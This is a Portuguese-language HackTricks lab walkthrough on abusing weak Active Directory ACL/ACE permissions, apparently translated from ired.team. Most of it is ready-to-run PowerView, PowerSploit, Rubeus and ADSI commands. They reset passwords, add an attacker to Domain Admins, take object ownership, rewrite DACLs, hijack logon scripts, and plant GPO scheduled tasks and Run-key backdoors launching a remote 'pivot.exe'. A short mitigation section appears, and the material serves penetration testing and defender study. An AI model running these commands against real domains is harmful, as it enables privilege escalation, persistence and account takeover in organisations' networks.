# Abusando das ACLs/ACEs do Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexto

Este laboratório é para abusar das permissões fracas das Listas de Controle de Acesso Discricionário (DACLs) e das Entradas de Controle de Acesso (ACEs) do Active Directory que compõem as DACLs.

Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACL/ACEs definem quem pode ler/modificar esses objetos (ou seja, alterar o nome da conta, redefinir a senha, etc).

Um exemplo de ACEs para o objeto segurável "Administradores de Domínio" pode ser visto aqui:

![](../../../.gitbook/assets/1.png)

Algumas das permissões e tipos de objetos do Active Directory que nós, como atacantes, estamos interessados são:

* **GenericAll** - direitos completos sobre o objeto (adicionar usuários a um grupo ou redefinir a senha do usuário)
* **GenericWrite** - atualizar atributos do objeto (por exemplo, script de logon)
* **WriteOwner** - alterar o proprietário do objeto para um usuário controlado pelo atacante e assumir o controle do objeto
* **WriteDACL** - modificar as ACEs do objeto e dar ao atacante controle total sobre o objeto
* **AllExtendedRights** - capacidade de adicionar usuário a um grupo ou redefinir senha
* **ForceChangePassword** - capacidade de alterar a senha do usuário
* **Self (Autoassociação)** - capacidade de adicionar-se a um grupo

Neste laboratório, vamos explorar e tentar explorar a maioria das ACEs mencionadas acima.

Vale a pena se familiarizar com todas as [arestas do BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) e com o maior número possível de [Direitos Estendidos](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) do Active Directory, pois você nunca sabe quando pode encontrar um menos comum durante uma avaliação.

## GenericAll no Usuário

Usando o powerview, vamos verificar se nosso usuário de ataque `spotless` tem `direitos GenericAll` no objeto AD para o usuário `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Podemos ver que, de fato, nosso usuário `spotless` possui os direitos `GenericAll`, permitindo efetivamente que o invasor assuma a conta:

![](../../../.gitbook/assets/2.png)

*   **Alterar senha**: Você pode simplesmente alterar a senha desse usuário com o seguinte comando:

```bash
net user <username> <password> /domain
```
*   **Kerberoasting direcionado**: Você pode tornar o usuário **kerberoastable** definindo um **SPN** na conta, kerberoastá-la e tentar quebrá-la offline:

```powershell
# Definir SPN
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# Obter Hash
.\Rubeus.exe kerberoast /user:<username> /nowrap
# Limpar SPN
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# Você também pode usar a ferramenta https://github.com/ShutdownRepo/targetedKerberoast
# para obter hashes de um ou todos os usuários
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **ASREPRoasting direcionado**: Você pode tornar o usuário **ASREPRoastable** **desabilitando** a **pré-autenticação** e, em seguida, ASREProastá-lo.

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## GenericAll em Grupo

Vamos ver se o grupo `Domain admins` possui permissões fracas. Primeiro, vamos obter o `distinguishedName` dele:
```csharp
Get-NetGroup "domain admins" -FullData
```
![](../../../.gitbook/assets/4.png)
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nosso usuário de ataque `spotless` possui novamente direitos `GenericAll`:

![](../../../.gitbook/assets/5.png)

Isso nos permite adicionar nós mesmos (o usuário `spotless`) ao grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

O mesmo pode ser alcançado com o módulo Active Directory ou PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Escrever em Computador/Usuário

* Se você tiver esses privilégios em um **objeto Computador**, você pode realizar [Delegação Restrita Baseada em Recursos do Kerberos: Assumir o Controle do Objeto Computador](../resource-based-constrained-delegation.md).
* Se você tiver esses privilégios em um usuário, você pode usar um dos [primeiros métodos explicados nesta página](./#genericall-on-user).
* Ou, se você tiver esses privilégios em um Computador ou usuário, você pode usar **Credenciais de Sombra** para se passar por ele:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty em Grupo

Se nosso usuário controlado tiver o direito de `WriteProperty` em `Todos` os objetos do grupo `Domain Admin`:

![](../../../.gitbook/assets/7.png)

Podemos novamente nos adicionar ao grupo `Domain Admins` e elevar os privilégios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## Autoassociação (Autoassociação de Membros) em Grupo

Outro privilégio que permite ao atacante adicionar-se a um grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Autoassociação)

Mais um privilégio que permite ao atacante adicionar-se a um grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Se tivermos `ExtendedRight` no tipo de objeto `User-Force-Change-Password`, podemos redefinir a senha do usuário sem saber sua senha atual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

Fazendo o mesmo com o powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Outro método que não requer mexer com a conversão de senha segura em string:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...ou um comando em uma linha se não houver uma sessão interativa disponível:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

e uma última maneira de conseguir isso a partir do Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Mais informações:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner no Grupo

Observe como antes do ataque, o proprietário do `Domain Admins` é `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Após a enumeração do ACE, se descobrirmos que um usuário sob nosso controle possui direitos de `WriteOwner` em `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...podemos alterar o proprietário do objeto `Domain Admins` para nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite em Usuário

O objetivo deste método é abusar das permissões de controle de acesso (ACL) no Active Directory para obter persistência em um ambiente comprometido. Especificamente, vamos explorar a permissão GenericWrite em objetos de usuário.

### Descrição

A permissão GenericWrite permite que um usuário modifique atributos específicos de um objeto no Active Directory. Essa permissão é normalmente concedida a grupos como "Domain Admins" e "Enterprise Admins". No entanto, se um usuário mal-intencionado conseguir obter essa permissão, ele poderá abusar dela para obter persistência no ambiente.

### Método

O método consiste em seguir as etapas a seguir:

1. Identificar um objeto de usuário no Active Directory que tenha a permissão GenericWrite concedida a um grupo de usuários.
2. Modificar os atributos do objeto de usuário para incluir um comando malicioso que será executado sempre que o objeto for acessado.
3. Aguardar que um usuário com permissões suficientes acesse o objeto de usuário, ativando assim o comando malicioso e fornecendo persistência.

### Impacto

Ao abusar da permissão GenericWrite em objetos de usuário, um invasor pode executar comandos maliciosos sempre que o objeto for acessado. Isso pode levar a uma variedade de consequências prejudiciais, como roubo de credenciais, movimento lateral na rede e comprometimento de outros sistemas.

### Mitigação

Para mitigar esse tipo de abuso, é recomendado:

- Revisar e limitar cuidadosamente as permissões de controle de acesso concedidas a grupos de usuários no Active Directory.
- Monitorar e auditar regularmente as permissões de controle de acesso no Active Directory para identificar qualquer permissão excessiva ou não autorizada.
- Implementar práticas de segurança recomendadas, como a segregação de funções e a aplicação do princípio do menor privilégio.
- Manter o Active Directory atualizado com as últimas correções de segurança para evitar vulnerabilidades conhecidas.

### Referências

- [https://attack.mitre.org/techniques/T1098/](https://attack.mitre.org/techniques/T1098/)
- [https://www.harmj0y.net/blog/activedirectory/acl-persistence-the-holy-grail-of-domain-privilege-escalation/](https://www.harmj0y.net/blog/activedirectory/acl-persistence-the-holy-grail-of-domain-privilege-escalation/)
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

A permissão `WriteProperty` em um `ObjectType`, que neste caso específico é `Script-Path`, permite que o atacante substitua o caminho do script de logon do usuário `delegate`, o que significa que da próxima vez que o usuário `delegate` fizer login, o sistema executará nosso script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Abaixo mostra o campo do script de logon do usuário ~~`delegate`~~ atualizado no AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite no Grupo

Isso permite que você defina como membros do grupo novos usuários (você mesmo, por exemplo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre as vulnerabilidades mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Se você é o proprietário de um grupo, como eu sou o proprietário de um grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

O que você pode fazer, é claro, através do powershell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

E se você tiver permissão `WriteDACL` nesse objeto AD:

![](../../../.gitbook/assets/24.png)

...você pode se conceder privilégios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) com um toque de magia ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
O que significa que agora você tem controle total sobre o objeto AD:

![](../../../.gitbook/assets/25.png)

Isso significa efetivamente que você pode adicionar novos usuários ao grupo.

Interessante notar que não consegui abusar desses privilégios usando o módulo Active Directory e os cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicação no domínio (DCSync)**

A permissão **DCSync** implica ter as seguintes permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.\
[**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Às vezes, certos usuários/grupos podem ter acesso delegado para gerenciar Objetos de Política de Grupo, como é o caso do usuário `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver isso usando o PowerView da seguinte forma:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
O abaixo indica que o usuário `offense\spotless` possui privilégios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre outros que são propícios para abuso:

![](../../../.gitbook/assets/a14.png)

### Enumerar Permissões do GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que o ObjectDN acima da captura de tela acima se refere ao GPO `New Group Policy Object`, pois o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, conforme destacado abaixo:

![](../../../.gitbook/assets/a15.png)

Se quisermos procurar especificamente por GPOs mal configurados, podemos encadear vários cmdlets do PowerSploit da seguinte maneira:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Computadores com uma Política Aplicada Específica**

Agora podemos identificar os nomes dos computadores nos quais a GPO `Política Mal Configurada` está aplicada:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Políticas Aplicadas a um Computador Específico**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**Unidades Organizacionais com uma Política Aplicada**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso do GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Uma das maneiras de abusar dessa configuração incorreta e obter a execução de código é criar uma tarefa agendada imediata através do GPO, como mostrado abaixo:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

O código acima adicionará nosso usuário spotless ao grupo local `administrators` do computador comprometido. Observe como antes da execução do código, o grupo não contém o usuário `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso do GPO**

{% hint style="info" %}
Você pode verificar se o módulo GroupPolicy está instalado com `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. Em caso de necessidade, você pode instalá-lo com `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, após a atualização do GPO, também precisará que alguém faça login no computador.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
Ele não pode criar GPOs, então ainda precisamos fazer isso com o RSAT ou modificar um ao qual já temos acesso de gravação.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar a Atualização da Política <a href="#force-policy-update" id="force-policy-update"></a>

As atualizações abusivas anteriores da **GPO são recarregadas** aproximadamente a cada 90 minutos.\
Se você tiver acesso ao computador, pode forçá-lo com `gpupdate /force`.

### Por baixo dos panos <a href="#under-the-hood" id="under-the-hood"></a>

Se observarmos as Tarefas Agendadas da GPO `Política Mal Configurada`, podemos ver nossa `evilTask` lá:

![](../../../.gitbook/assets/a22.png)

Abaixo está o arquivo XML que foi criado pelo `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa na GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Usuários e Grupos <a href="#usuários-e-grupos" id="usuários-e-grupos"></a>

A mesma escalada de privilégios pode ser alcançada abusando do recurso de Usuários e Grupos do GPO. Observe no arquivo abaixo, na linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - podemos alterar o usuário para outra coisa, adicionar outro ou até mesmo adicionar o usuário a outro grupo/múltiplos grupos, já que podemos modificar o arquivo de configuração da política no local mostrado devido à delegação do GPO atribuída ao nosso usuário `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

Além disso, podemos pensar em aproveitar scripts de logon/logoff, usar o registro para autoruns, instalar .msi, editar serviços e outras formas de execução de código.

## Referências

* Inicialmente, essas informações foram em grande parte copiadas de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre as vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, realiza varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
